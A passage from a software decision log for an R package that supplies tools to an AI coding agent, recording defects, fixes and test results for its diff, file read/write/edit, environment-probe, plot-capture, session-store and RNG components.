   16.5 s.
6. **The LIS step was quadratic on reordered input** (review round 1). The plan finds each
   anchor's pile with `findInterval()`, which checks on every call that its `vec` is sorted, an
   O(L) scan of the tails. When anchors are out of order but have a long increasing run (any
   moved line or block in a large file) the tails grow with the input and the step costs
   O(n * L): moving a 1,000-line block in a 200,000-line file took 9.6 s in `diff_lines()`, and
   `diff_lis(c(2:200000, 1L))` 9.5 s (red run). The `checkSorted` argument that skips the check exists
   only from R 4.5.0; the package depends on R >= 4.2.0.

These affect `edit` (Task 6), P15's document writer and P16's checkpoints, which diff whole
files.

The fixes:
- Lines are compared as integer codes, and a last line without its newline gets the negated code.
- `diff_unified()` raises `gptr_error_invalid_argument` for a bad `path`, `old`, `new` or
  `context`.
- `context` is clamped to the edit script's length.
- `v` spans diagonals -(D + 1) .. D + 1, and each round keeps only its window -d .. d, so memory
  is O(D^2). The backtrack loops over `rev(seq_len(d))`.
- `diff_hunks()` is vectorised over the rows of all hunks at once.
- `diff_match()` keeps its stack in four integer vectors with a top index and vectorised pushes.
- `diff_lis()` keeps the tails in vectors of length n with a length counter: a value above the
  last tail is appended in O(1), any other finds its pile by binary search, so the step is
  O(n log n). The plan text's "through `findInterval()`" is replaced; the result is the same.

A diff whose budget is smaller than its truncation notice is now documented as the notice alone.
No signature, class or output format changed. Wherever the plan-literal source worked, the
outputs are identical: a differential check of 3,000 generated pairs, 60,000 `diff_lines()`
calls, 24,000 `diff_unified()` calls and 7,988 `diff_myers()` calls found 0 differences. The new
`diff_lis()` returned the same indices as the `findInterval()` version on 5,000 generated inputs
(permutations, repeats, reversals, rotations), and `diff_lines()`/`diff_ops()` were identical on
2,000 generated pairs with moved lines.

Validation: `progress/P10.md`, Task 3. Nine blocks (149 expectations, 118 of them from a `git
apply` property test over 60 generated pairs with context 0, 1 and 3 and every final-newline
combination) were added to the plan's 6 blocks, which are unchanged. Two of them came with
review round 1: the LIS against an O(n^2) reference on 300 generated inputs, and a timing block
(a 1,000-line block moved in 200,000 lines, under 5 s; red `[ FAIL 2 | WARN 0 | SKIP 0 |
PASS 566 ]` at 9.6 s and 9.5 s before the fix).
- Against the plan-literal source the test file before review round 1 gave
  `[ FAIL 7 | WARN 1 | SKIP 0 | PASS 543 ]`.
- Final `^tool-diff$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 568 ]` (the plan's 419 plus 149), the
  same under `LC_ALL=C`.

## D-047 - P09 r_env probe: LinkingTo never makes a package unloadable, a loaded namespace is installed at its loaded version, lookups by name, no warning for a directory that is not an installed package (2026-10-04)

P09 Task 5's plan-literal `env_probe_packages()` (`R/env-probe.R`) was changed in the three ways
below. Each was found by a probe of the plan-literal source
(`dev/.validation/P09/task5-probe-plan-literal.log`). The registry, `env_probe_deps()`,
`env_probe_session()`, `env_probe_render()`, the `<r_env>` grammar and the cache are unchanged.

1. **Only Depends and Imports decide "Installed but NOT loadable"; LinkingTo does not.** The plan
   text counts LinkingTo as a hard dependency, but 04 section 7.9 and 03 sections 7.3 and 7.5
   define the line as packages that are installed but not loadable, and R reads LinkingTo only
   when it compiles a package. A check (`task5-linkingto-check.R`, `.log`) installed two R-only packages
   into a temporary library and recorded a dependency on a package that is not installed: with
   LinkingTo the package loads and attaches in a child Rscript; with Imports (and its NAMESPACE
   import) loading fails ("there is no package called"). A library holding binaries installed
   without their header-only LinkingTo packages would otherwise tell the model not to
   `library()` working packages. No installed package on the development machine has such a
   missing LinkingTo package (probe B: 0).
2. **A loaded namespace is installed at its loaded version, and every lookup is by name.** The
   plan named the paths of one vectorised `find.package()` by their `basename()` and read
   `Meta/package.rds` from each. A namespace loaded from a source tree (`pkgload::load_all()`)
   breaks both: its directory need not carry the package name (a clone named `seurat` or
   `p09devpkg-main`), and it has no `Meta/package.rds`. The plan-literal probe reported such a
   loaded package as "Not installed" (probe C). With `lib = NULL`, a package whose namespace is
   loaded now takes `getNamespaceVersion()` (guarded by `isNamespaceLoaded()`, so nothing is
   loaded) and has nothing missing; any other package is looked up with one `find.package()` per
   name, and the dependencies through `env_probe_found()`, one `find.package()` per name,
   memoised for the dependencies the probed packages share.
3. **No warning for a directory that is not an installed package.** `find.package()` accepts a
   library directory with only a `DESCRIPTION`, but `library()` refuses it ("is not a valid
   installed package"). The plan's `tryCatch(readRDS(...), error = )` let the `gzfile()` warning
   for the missing `Meta/package.rds` escape. The file's existence is now checked first, and such
   a directory still counts as not installed. The same rule covers dependencies
   (`env_probe_path()`, shared by `env_probe_packages()` and `env_probe_found()`):
   `loadNamespace()` refuses such a directory ("does not have a namespace"), so a package that
   imports it is "Installed but NOT loadable" with it as the missing dependency, and the section
   no longer lists the package under Installed and its dependency under Not installed (review
   round 1). With `lib = NULL` a loaded dependency counts as found, as a loaded probed package
   does, so a dependency loaded from a source tree is not reported missing.

Known limits, unchanged from the plan's design: the out-of-process load probe is not run, so a
package whose compiled library cannot be loaded is listed as installed (BPCells on the
development machine: "unable to load shared object" in a child process); only direct
Depends/Imports are checked, without their version requirements; and a pathologically broken
library can exceed the section's 450-token budget (probe D3: 3,580 tokens with all 36 packages
each missing 40 dependencies; 351 with each missing one), which `prompt_freeze()` truncates at a
line boundary with a diagnostic (04 section 7.7).

Validation: `progress/P09.md`, Task 5. Four blocks (15 expectations) were added to the plan's 5
blocks (16 expectations), which are unchanged; the plan's `fake_lib()` helper gained `...` for
extra DESCRIPTION fields. Against the plan-literal source the first three added blocks gave
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 20 ]` (`task5-red-adaptations.log`); the fourth (dependencies,
review round 1) gave `[ FAIL 2 | WARN 0 | SKIP 0 | PASS 29 ]` against the round-0 source
(`task5-fix1-red.log`). Final `^env-probe$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 31 ]`
(`task5-fix1-green.log`), the same under `LC_ALL=C` (`task5-fix1-green-clocale.log`).

## D-048 - P10 read engine: BMP needs a DIB header, magick failures are notes, whole characters, integer-range offsets, the token-limit notice, BOM-aware and late-byte decoding, NUL means binary, bounded streaming windows, an LRU index cache keyed by the tool path (2026-10-04)

P10 Task 4's plan-literal `R/tool-read.R` passes the plan's 12 blocks (80 expectations) but had
these defects, each reproduced against that source (`dev/.validation/P10/task4-probe-plan-literal.log`,
`task4-probe-giant-line-plan-literal.log`, `task4-probe-clocale-index.log`):
1. **Any text file starting with `BM` was a BMP.** The sniff checked only `BM` and 26 bytes, so
   `BMI notes: ...` went to magick, which stopped `read` with `ImproperImageHeader`. Pi's
   `mime.ts` needs a plausible DIB header (report 01 section 2.3 and its verified port in
   section 5): `bmp_header_ok()` checks the file size, pixel offset, a core (12) or info
   (40-124) header, one plane and a standard bit depth.
2. **A magick decode error stopped `read`.** An image whose magic bytes pass but that magick
   cannot decode is now omitted with Pi's note `[Image omitted: could not be converted to a
   supported inline image format.]` (`process_image_magick()` runs under `tryCatch()`).
3. **`image_dims()`**: JPEG fill bytes (`FF FF`) before a marker were read as a segment length
   (dimensions lost); a BMP core header has 16-bit dimensions.
4. **Offsets.** `format(100000)` is `1e+05`, so the error read `Offset 1e+05 is beyond end of
   file`; it is now `Offset 100000 ...` (Pi prints the number). `offset = 1e10` was coerced to
   `NA` with a warning and then a base error; `offset` and `limit` are now checked within the
   integer range (`gptr_error_invalid_argument`), and the window end is computed in double, so
   `limit = .Machine$integer.max` no longer overflows `offset + n - 1L`.
5. **A long line cut on a character boundary lost a whole character.** `read_line_prefix()`
   stripped the last complete multi-byte character whenever the cut fell after it (51,198
   instead of 51,200 bytes of `é`). The new `utf8_trim_partial()` drops only an incomplete
   final sequence.
6. **A first line cut by the token budget claimed the 50 KB cap** (`[Line 1 is 2.0KB, exceeds
   the 50.0KB limit; ...]` for `budget_tokens = 10`). It now names the cause: `exceeds the 10
   token limit`.
7. **The in-memory reader ignored a UTF-8 BOM when deciding the encoding**, so a BOM file with
   invalid bytes read as CP1252 while `decode_raw()` (used by write and edit) says lossy UTF-8.
   It now calls `decode_raw()` on the bytes with their BOM.
8. **Streaming-reader decoding (files above 16 MiB).** The encoding came from the first 64 KB
   minus 4 bytes, which can still end inside a character: a valid file then decoded as CP1252
   (mojibake in every window) or got a false lossy notice. The head is now cut back to a
   character boundary. A CP1252 gap byte (`0x81`) in a later window gave the line `"NA"`; such a
   window now falls back to latin1. Invalid UTF-8 in a later window now sets the lossy notice.
9. **NUL bytes past the 8,000-byte sniff.** In a large file, a NUL in the head past byte 8,000
   raised `The file contains NUL bytes` (`invalid_argument`) and a NUL in a later window a base
   `embedded nul` error or a cut line. In a file up to 16 MiB, an embedded NUL made
   `rawToChar()` fail (binary), but trailing NULs are silently dropped by `rawToChar()`: the
   file then showed as text without them, or, when it was not valid UTF-8, `decode_raw()`
   raised `The file contains NUL bytes` (review round 1). All now give the binary notice: the
   in-memory reader looks for a NUL anywhere with `grepRaw()` (ripgrep's rule, report 11
   section 2.2), the streaming reader in its 64 KB head and in the window.
10. **The streaming reader was not bounded in memory.** It kept every byte up to the end of the
    window, so a giant line was read whole: a 40 MB single-line file peaked at 45.9 million
    Vcells (about 367 MB) against 8.4 million after the fix (the package's baseline). It now
    keeps at most `read_window_cap` (102,400) bytes of a window through `read_span()`; the line
    cut there is kept in part, past the 50 KB cap, so `truncate_lines_head()` reports the
    truncation, and the length of a first line longer than the cap is measured by scanning
    (`first_bytes`). `read_text_window()` gained `cap = Inf` (passed by `read_core()`).
11. **The sparse-index cache** keyed entries through P01's `path_key()`, which fails with
    "unable to translate" for a non-ASCII path in a C locale, so a large file in such a
    directory could not be read there. It also evicted the alphabetically first keys and kept
    entries of older versions of a file. It now keys on the normalised tool path, keeps a list of
    at most 8 entries compared by value, evicts the least recently used and drops an older
    version's entry when a file is indexed again. `path_key()` is no longer consumed.

No signature, class or text of `read_file()`, `read_lines_value()` or `gptr_lines` changed,
except the token-limit wording of item 6. The internal additions are `utf8_trim_partial()`,
`bmp_header_ok()`, `process_image_magick()`, `read_span()`, `read_window_cap`, the `cap`
argument of `read_text_window()` and `read_window_big()`, the `first_bytes` field of a window and
`read_core()`'s `first_line_limit`.

Validation: `progress/P10.md`, Task 4. Fifteen blocks (49 expectations) were added to the plan's
12 blocks, which are unchanged. Against the plan-literal source the final test file gave
`[ FAIL 23 | WARN 0 | SKIP 0 | PASS 90 ]` (`task4-fix1-red-plan-literal.log`) and, under
`LC_ALL=C`, `[ FAIL 23 | WARN 1 | SKIP 0 | PASS 89 ]` (`task4-fix1-red-plan-literal-clocale.log`;
the non-ASCII index block is red in both locales, through `unable to translate` under `LC_ALL=C`).
Final `^tool-read$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 129 ]`, the same under `LC_ALL=C`.

## D-049 - P09 plot capture: while no human can see a device, a default device the code opens is offscreen too; a reused device number starts a new page; plot_png() keeps no PNG (2026-10-04)

P09 Task 6's plan-literal `R/eval-plots.R` was changed in the three ways below. Each was found by
a probe of the plan-literal source (`dev/.validation/P09/task6-probe.R`,
`task6-probe-plan-literal.log`; the plan-literal file is kept as
`task6-eval-plots-plan-literal.R`). `plot_png()`'s signature and result, the PNG size and
devices, the visual-change and prefix heuristics, the low-level merge (`fig.keep = "high"`) and
the plan's six test blocks are unchanged.

1. **The `device` option opens pdf(NULL) while no human can see a device (IC-67).** The plan
   opened one `pdf(NULL)` at `plot_begin()`. When the evaluated code closed it (`dev.off()`,
   `graphics.off()`, a common model pattern after a plot) and drew again, R opened its default
   device: `Rplots.pdf` in `getwd()` under Rscript, with its display list off, so the later
   plots were not captured either. The same happened in device mode without a human after the
   code closed the user's device. `plot_close()` then closed whatever device had reused the
   number of the private one. 04 section 15 IC-67 and 03 section 6.12 ask for no `Rplots.pdf` in
   the working directory. R opens the `device` option for every implicit device (`plot()`,
   `par()`, `layout()`, grid drawing) and for `dev.new()`; `par()`, `layout()` and grid drawing
   without `grid.newpage()` run no plot hook, so the hooks of Task 8 cannot cover it. Now
   `plot_begin()` sets `options(device = <closure over the plot state>)` in "capture" mode and
   in every mode when no human is present; the closure opens another
   `pdf(NULL)` with the display list enabled (`plot_open_offscreen()`), whose number joins
   `ps$our_devs`. `plot_close()` restores the option first and closes every device in
   `ps$our_devs` that is still open. The option is set last in `plot_begin()`, so a failure
   before it cannot leave it changed. With a human present in "auto" mode the option is not
   touched: the human's default (screen) device opens as before. In "capture" mode
   `plot_capture()` skips the user's devices open at `plot_begin()` (`ps$devs0`) but not a device
   of `ps$our_devs`: after the code closed the user's device and the private one
   (`graphics.off()`), R opens the next offscreen device at the user's old number, and its plots
   are captured too (review round 1; the plan compared the number with `ps$our_dev` only).
2. **A device number R reuses starts a new page.** `ps$last_dl` and `ps$last_k` are keyed by the
   device number. A new offscreen device clears both for its number, so a page on it is never
   treated as a low-level addition to the closed device's page. Without this, `plot(1:3)`,
   `dev.off()`, `plot(1:3); abline(h = 2)` replaced the first recording instead of adding the
   second plot (`task6-mutant-noclear.log`). `plot_close()` also drops `ps$last_dl` (capture has
   ended; the recordings themselves are dropped by `plot_render_all()` as before).
3. **`plot_png()` keeps no PNG.** Its PNG is only the source of the block's bytes, but the
   plan left one file per call in `<workspace>/cache/tmp`, also when the replay failed (probe E).
   It is now removed on exit. `plot_render_all()` removes the PNG of a replay that failed (its
   other PNGs are the paths the `plot` events carry and stay, as planned).

Known limits, unchanged from the plan's design: in "capture" mode with user devices open, code
that closes the private device draws on the device R makes current, a user's device, which is
not captured; a user's file device opened with its display list off holds no display list before
`plot_begin()` enables it, so a low-level addition on it is recorded alone (`plot_render_all()`
gives `NA` for it when the replay fails); a device the code opens explicitly (`png()`) at a number
the private device used before is closed by `plot_close()`; R offers no public way to tell
devices apart beyond their numbers (`dev.displaylist()` is internal, report 12 A5).

Validation: `progress/P09.md`, Task 6. Three blocks (20 expectations) were added to the plan's 6
blocks (32 expectations). The final test file against the plan-literal source gave 10 failed and
42 passed expectations (`task6-red-adaptations-final.log`). Review round 1 added two blocks (14
expectations): the capture-mode device at a reused user number failed 2 before its fix
(`task6-fix1-red.log`), and a mutant of `plot_render_all()` that keeps a failed replay's PNG
fails 1 (`task6-fix1-mutant-nounlink.log`). Final `^eval-plots$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 66 ]` (`task6-fix1-green.log`), the same under `LC_ALL=C` with
`_R_CHECK_SCREEN_DEVICE_=stop` (`task6-fix1-green-clocale.log`).

## D-050 - P06 store reader and resume: entries that parse but cannot be read are skipped, ids are checked before they name anything, mode, model and frozen prompt come from the active path, a failed or interrupted rebuild leaves nothing registered, a rebuilt fork's usage is its own, a time that is not ISO 8601 falls back (2026-10-04)

P06 Task 13's literal reader and `store_rebuild()` are changed in six ways. Task 14's
`session_replay_new()`, P15's replay, P16's rewind and every `gptr_resume()` caller consume them:

1. **`store_read()` also skips a line that parses but is not a readable entry.** These are
   objects without a string `type` or entry id (one non-empty string of at most 10000 bytes),
   and messages that P01's `msg_from_json()` refuses. A `parentId` that cannot be an entry id
   counts as missing, so the entry is re-parented to the previous one. In the plan, any of these
   made the whole file unreadable: `assign(NULL, ...)` failed, `msg_from_json()` failed, a
   numeric `type` selected a `switch()` branch by position, or `exists()` failed. Contract 04
   section 7.6 and IC-59: the reader "skips any unparsable line with a diagnostic". They count in
   the same single `torn_line` diagnostic.
2. **Ids are checked before they name a registry entry, a file or a pattern.**
   - `store_rebuild()` refuses a header id that fails `check_session_id()`'s rule, before
     `session_by_id()`, with `gptr_error_invalid_argument` (`arg = "x"`). The plan raised base R's
     unclassed `get0()` error for a non-string id, and `session_new()`'s refusal (`arg =
     "opts$id"`) for a path-like one.
   - `store_find()` returns `NULL` for a string that cannot be a session id, and matches file
     names with `endsWith()`. With the plan's regex built from the id, `gptr_resume(".*")`
     resumed an arbitrary stored session.
   - `gptr_resume(<directory>)` is `gptr_error_invalid_argument`, not base R's `readLines()`
     error.
   - The new helper `session_id_ok()` holds `check_session_id()`'s rule, which is unchanged.
3. **The mode, the model and the frozen prompt of a rebuilt session come from its active path**
   (root -> the last entry, 04 section 6.5).
   - The plan read the mode from every entry of the file, so a sibling branch's later mode change
     decided it.
   - The frozen prompt is now the last `gptr.frozen` entry on the path, as Task 12's
     `fork_frozen()` and P07's planned restore read it. The plan took the first one in the file,
     which differs after an IC-52 refreeze or on a sibling branch.
   - `rebuild_model()` also reads the `model` of the path's `gptr.frozen` entry (the model of the
     first run), which later `model_change` entries and answers override. A session stopped
     before its first answer keeps its model instead of resuming as `"unknown/unknown"`.
4. **A rebuild that fails after `session_new()` leaves nothing registered.** The plan undid the
   registration only for a `store_open()` failure. Any other error (a usage record that P05's
   `usage_row()` refuses, for example) left a live session with the recorded id and no store,
   which the next `gptr_resume()` returned unlocked and `gptr_last()` pointed at. Now every step
   after `session_new()` runs in `rebuild_fill()`. Until it completes, an `on.exit()` handler
   (`rebuild_undo()`, under `suspendInterrupts()`) releases a lock this process took, calls
   `live_forget()` and restores `the$last`. This covers an interrupt (Esc, Ctrl-C) as well as an
   error, and the condition propagates unchanged. Architecture 03 section 6.4 records
   interruption with `on.exit()`, never with an exiting `tryCatch()`; a `tryCatch(error =)` (the
   first version of this fix) let an interrupt through and left the half-built session behind.
5. **A rebuilt fork's usage rows are its own requests.** The plan's `rebuild_usage()` read every
   assistant message of the file. A fork's file starts with the source path that `store_fork()`
   copied (written first by `store_open()`, ids kept, up to the header's `gptr.forkOf.entry`), so
   a resumed fork reported the source's requests, under the source's recorded request ids, as its
   own: `$usage`, `$cost` and `gptr_usage()` were overstated, and `gptr_usage()` over all live
   sessions (deduplicated by request id, the first session in id order kept) could credit the
   source's requests to the fork. Contract 04 section 6.5: nothing live is shared with a fork,
   usage included; a live fork's usage holds only its own requests (Task 12). The new
   `rebuild_own()` leaves out the copied prefix. A fork at turn 0 copies nothing and has no
   `forkOf.entry`; a `forkOf.entry` missing from the file (a skipped line) leaves the entries as
   they are.
6. **A time that is not ISO 8601 falls back instead of failing.** `iso_ms()` returned `NA` for a
   string in another format, or for a non-string, so the callers' `%||%` fallbacks never applied.
   One hand-edited assistant entry time then made P05's `usage_row()` refuse the start time and
   the whole session could not be resumed, against item 1's aim; a header time gave
   `d$created = NA` and an `NA` `created` in `gptr_sessions()`. `iso_ms()` now returns `NULL` for
   anything but one parsable ISO 8601 string. A usage row's start time falls back to the
   message's own epoch-ms time, then to the epoch; `created` falls back as for a missing time.

Validation: `progress/P06.md`, Task 13 (`test-session-store.R`). Four blocks (31 expectations)
were added to the plan's tests, then, in review round 1, two blocks and an interrupt variant of
the undo block (15 expectations). Against the plan-literal source, the first four blocks gave 10
failures and 230 passes, all failures in the added blocks (`task13-literal.log`). The review
round's additions failed 9 times against the first version of this fix
(`task13-fix1-red.log`). Final `^session-(live|store)$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 270 ]`
(`task13-fix1-focused.log`).

## D-051 - P10 write engine: a file without a line ending is written as given, the 1 MiB sample ends on a whole character, a new file gets the umask's mode, ".." links climb as the kernel does, 40 links are followed, non-ASCII paths in a C locale, an unreadable file is written verbatim, a read-only file is refused (2026-10-04)

P10 Task 5's plan-literal `R/tool-write.R` passes the plan's five blocks (20 expectations) but had
these defects, each reproduced against that source (`dev/.validation/P10/task5-probe-plan-literal.log`,
`task5-probe-plan-literal-clocale.log`; the plan-literal file is kept as
`task5-plan-literal-tool-write.R`, the probe script as `task5-probe.R`):
1. **A file without a line ending had its content's line endings rewritten.** An existing empty
   or one-line file counted no CRLF, so its "dominant" line ending was LF and `a\r\nb\r\n`
   became `a\nb\n`. Such a file has no convention to keep: `write_conventions()` now returns
   `eol = "asis"` and the content is written as given (Pi, report 01 section 2.4); its encoding
   and BOM are still kept. `details$eol` is `"asis"` there, the value new files already had.
2. **A UTF-8 file whose 1 MiB sample ended inside a character read as CP1252.** With few
   non-ASCII characters before the cut, `decode_raw()` counted the cut sequence as invalid bytes
   and chose CP1252, so `é` was written as the single byte `0xE9` into a UTF-8 file and a CJK
   character was refused with `cannot be represented in the file's encoding (CP1252)`. A sample
   shorter than the file (without a BOM or with a UTF-8 BOM) is now cut back to a whole character
   with Task 4's `utf8_trim_partial()` (report 11 section 2.2's rule for the read head).
3. **Every new file was private (0600).** P01's `write_atomic()` creates its files with mode 0600
   on purpose, for gptr's own state (`progress/P01.md`, "Independent review corrections after
   Task 8"). Pi's `writeFile()` and editors create 0666 minus the umask (0644 under umask 022).
   `write_bytes_keep_mode()` now applies `Sys.chmod(p, "0666", use_umask = TRUE)` to a file it
   created (not on Windows); an existing file keeps its mode as before. Task 6's patch `Add File`
   uses the same function and inherits this.
4. **A relative link that climbs with ".." named the wrong file.** `resolve_link_target()` joined
   the link text to the link's directory lexically, so `proj/linkdir/f.txt -> ../shared/f.txt`
   with `proj/linkdir -> other/real` resolved to `proj/shared/f.txt` instead of the kernel's
   `other/shared/f.txt`: the write created `proj/shared/` and a new file and left the real target
   unchanged. The same held for an absolute link text and for a ".." after a symlinked component
   inside the link text (`abs.txt -> <td>/proj/linkdir/../shared/f.txt`). A link text with a ".."
   segment, relative or absolute, is now joined to the link's directory and handed to the new
   `tool_path_physical()`, which resolves the longest existing leading part of the joined path
   with `normalizePath()` (the kernel's order: each link before the ".." after it) and leaves the
   rest, which does not exist yet, to the lexical `tool_path_norm()`. A dangling link into a
   directory that does not exist yet (`<td>/proj/linkdir/../new/g.txt`) therefore creates
   `other/new/g.txt`, as `mkdir -p` on the link text would. Link texts without ".." keep the
   lexical join, so `details$path` keeps the caller's spelling (independent review round 1).
5. **The hop limit was off by one.** The loop followed 40 links but never examined the 40th
   target, so a chain of exactly 40 links (Linux's MAXSYMLINKS) was refused with `ELOOP`. Now 40
   links are followed and the 41st is refused; a loop still gives `ELOOP`.
6. **Non-ASCII paths failed in a C locale.** `dirname()` of a marked UTF-8 non-ASCII path raises
   `unable to translate ... to native encoding` and `file.path()` turns it into `<U+00E9>`
   escapes, so `write_file("déjà/fü.txt", ...)` failed under `LC_ALL=C` and a relative
   link there would have been resolved to an escaped path. The new `tool_path_dir()` takes
   `dirname()` of the unmarked bytes (`fs_path()`) and re-marks the result UTF-8; link texts are
   joined with `paste0()`.
7. **A file that may be written but not read (mode 0200) raised a base error** (`cannot open the
   connection`, with a warning) while reading the sample. Its conventions are unknown, so it is
   now written as given, like a binary file, and keeps its mode (Pi's `writeFile()` succeeds
   there too).
8. **A read-only file was replaced silently.** `write_atomic()` renames a temporary file over the
   target, which needs only a writable directory, and `write_bytes_keep_mode()` then put the 0444
   mode back, so `write` rewrote a file that Pi's `writeFile()` refuses with `EACCES` and that
   Task 6's `edit_compute()` refuses with `Could not edit file: <path>. Error code: EACCES.`
   `write_file()` now checks `file.access(target, 2L)` for an existing (link-resolved) target and
   raises `EACCES: permission denied, open '<path>'` (`gptr_error_invalid_argument`, Node's text,
   the absolute path as given) before encoding anything; the file is left unchanged. A file in a
   read-only directory still fails in `write_atomic()` with `gptr_error_doc_write`
   (independent review round 1).

The `EISDIR` check also runs on the resolved target, so a resolution that lands on a directory is
refused instead of failing in the rename. Interfaces are unchanged: `write_file(path, content)`
and its result, `resolve_link_target(p, max_hops = 40L)`, `write_bytes_keep_mode(target, bytes)`
-> `invisible(existed)`. Internal additions: `write_sniff_bytes`, `tool_path_dir()`,
`tool_path_physical()`.

Validation: `progress/P10.md`, Task 5. Seven blocks (32 expectations) were added to the plan's
five blocks, which are unchanged. Against the plan-literal source the test file of that time gave
`[ FAIL 14 | WARN 0 | SKIP 0 | PASS 24 ]` (`task5-red-plan-literal.log`; every failure is in an
added block). Review round 1 added two blocks (12 expectations) for items 4 and 8, red before the
fix (`[ FAIL 8 | WARN 1 | SKIP 0 | PASS 55 ]`, `task5-fix1-red.log`). Final `^tool-write$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 64 ]`, the same under `LC_ALL=C`.

## D-052 - P09 agent RNG streams: rng_swap() also restores R's generator kind when the user had a seed; the word 2^31 is stored as NA without a warning (2026-10-04)

P09 Task 7's plan-literal `R/eval-core.R` was changed in the two ways below. The signatures of
`rng_seeds()` and `rng_swap()`, the derivation of IC-61 (24 bytes of sha256, modulo m1 and m2,
two's complement), the state fields `seed` and `id`, the no-seed branch and the plan's 4 test
blocks are unchanged.

1. **The user's generator kind is restored when the user had a seed (review round 1).** R keeps
   the kind internally. The plan put back the user's vector, which is identical, but left the
   agent's L'Ecuyer-CMRG as R's internal kind until R next read the variable. A user who then
   removed `.Random.seed` (`rm(list = ls(all.names = TRUE))`) got L'Ecuyer-CMRG from
   `set.seed(42)`: `runif(1)` gave 0.1738 instead of 0.9148. A later swap made without a seed
   then read L'Ecuyer-CMRG as the user's kind and kept it in force. This is the defect the plan
   fixes for the no-seed branch (Self-review ambiguity 16), on the other branch. Now, after the
   vector is put back, `stats::rbinom(1L, 0L, 0.5)` makes R read the kind from the user's full
   vector and draws nothing, and the vector is assigned again so it stays identical. The kind is
   not re-synced from the length-1 kind code, because that path (RNG_Init) drops a cached
   Box-Muller normal; the full vector keeps it. The call is wrapped in
   `try(suppressWarnings(...), silent = TRUE)`, so a vector R rejects (wrong length, not
   integer, an NA or invalid kind) never turns into an error or warning at the end of an agent's
   evaluation. R checks such a vector again at the user's next draw, as without the swap.
   `RNGkind()`, `set.seed()`, `sample()` and `runif()` stay unused (IC-61).
2. **The word 2^31 is stored as `NA_integer_` without a warning.** The plan turned a reduced
   word of exactly 2147483648 into `-2147483648`, and `as.integer()` made it NA with the warning
   "NAs introduced by coercion to integer range" (about 6 chances in 2^32 per key). NA is that
   word's two's-complement bit pattern, R reads it back as 2^31, and a seed with NA words gives
   reproducible draws. `rng_seeds()` now sets that value to NA before `as.integer()`.

Validation: `progress/P09.md`, Task 7. Six blocks (22 expectations) were added to the plan's 4
blocks (17). Review round 1 added two blocks (11 expectations): the kind with a seed failed 2
against the round-0 source (`task7-fix1-red.log`), and a mutant that re-syncs without `try()`
and `suppressWarnings()` fails the rejected-vector block (`task7-fix1-mutant-notry.log`). Final
`^eval-core$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 50 ]` (`task7-fix1-green.log`).

## D-053 - P10 edit engine: whole-line patch hunks, one operation per file, Codex's hunk-line rule, a checked Delete File, fuzzy envelopes carry the diff, a lone CR stays out of the diff, a NUL means binary, string fields, the shim finds envelopes and never reads a named file, linear match search (2026-10-04)

P10 Task 6's plan-literal `R/tool-edit.R` passes the plan's 15 blocks (79 expectations) but had
these defects, each reproduced against that source (`dev/.validation/P10/task6-probe-plan-literal.log`
and `-clocale.log`; the plan-literal file is kept as `task6-plan-literal-tool-edit.R`, the probe as
`task6-probe.R`). Signatures and result shapes are the plan's (04 section 7.10):
1. **A patch hunk that only removed lines left an empty line.** Each hunk became an
   `oldText`/`newText` pair of its joined lines without a line ending, so `@@ / -y = 2` turned
   `x = 1\ny = 2\nz = 3\n` into `x = 1\n\nz = 3\n` (CRLF and fuzzy variants alike). Codex hunks
   are blocks of whole lines. Such a hunk (no context, nothing added) now also removes the line
   ending after the block when the block starts a line and ends one (the LF view first, then its
   fuzzy normalisation, as `apply_edits()` searches), or the ending before it when the block ends
   a file without a final newline. A block found only inside a line keeps the plan's substring
   semantics, and the uniqueness check still runs on the widened text.
2. **A file named by two operations lost a change, or was deleted.** Every operation is computed
   against the original files, so two `*** Update File` sections of one file wrote only the
   second update (reported as 2 files changed), an update plus a delete of one file deleted it,
   a move onto another operation's file raced it, and on a case-insensitive file system
   `Update case.R / Move to CASE.R` wrote the file and then removed it under its old name,
   leaving nothing. `patch_apply()` now refuses, before computing anything, a patch in which two
   operations name one file (`Invalid patch: more than one operation names <path>; put all
   hunks of a file under one *** Update File.`); paths are compared by `patch_key()` (item 15).
   A move removes the name it moved (a link itself), not the link's target: the plan deleted the
   target and left a dangling link. Whether the old name is the file just written is asked of the
   file system (item 13).
3. **Hunk lines follow Codex's rule.** A line of an update hunk must start with " ", "-" or "+"
   (an empty line is empty context); the plan dropped the first character of any other line and
   used the rest as context. Such a line, and an `*** Update File` without hunks (also with only
   a `*** Move to`), are now `Invalid patch: ...` errors; the plan reported the latter as `Edit
   tool input is invalid. edits must contain at least one replacement.`
4. **`*** Delete File` is checked.** The plan's `file.remove()` deleted an empty directory and
   ignored a failed removal. A directory is refused before anything is written (`Could not delete
   file: <path>. Error code: EISDIR.`); a removal goes through `unlink(expand = FALSE)` (which
   never removes a directory and never reads the name as a pattern, item 12) and a failure is
   `gptr_error_doc_write`. An `*** Add File` without content lines
   writes an empty file (the plan wrote one newline).
5. **An envelope whose hunk matched only through the fuzzy fallback reported no deviation.**
   `edit_from_patch()` set `fuzzy = FALSE`, `deviated = FALSE` and an empty `diff`, so the result
   text never carried the diff that contract section 9.2 and acceptance 6 require when the fuzzy
   fallback, an EOL change or a re-encoding changed what was asked. `patch_apply()`'s details now
   add `fuzzy` and `reasons` (from the same `edit_reasons()` that `edit_file()` uses), and
   `edit_from_patch()` returns them with `diff` = the patch's unified diff cut to 400 tokens.
6. **A lone CR produced a spurious diff.** The bytes were kept, but the after-view of the diff
   turned a lone CR into a line break while the before-view kept it, so `a\rb\nc\n` edited at
   `c` showed three changed lines. Both views now read only CRLF as LF.
7. **A UTF-8 BOM file with a NUL byte past the first 8,000 bytes** failed with `decode_raw()`'s
   `The file contains NUL bytes: it is binary.` instead of the edit text `Could not edit file:
   <path>. It is a binary file.`; a UTF-8 BOM no longer exempts a file from the NUL check (only
   UTF-16/32 BOMs do).
8. **An `oldText`/`newText` that is not one string** (a number, `NA`, a vector) stopped with a
   base R `vapply()` or `gregexpr()` error. Pi's shim now refuses it with
   `gptr_error_invalid_argument`: `Edit tool input is invalid. edits[<i>].<field> must be a
   string.` (fields absent or `NULL` keep the plan's defaults).
9. **The shim never saw an envelope inside other edit shapes.** An envelope pasted as the only
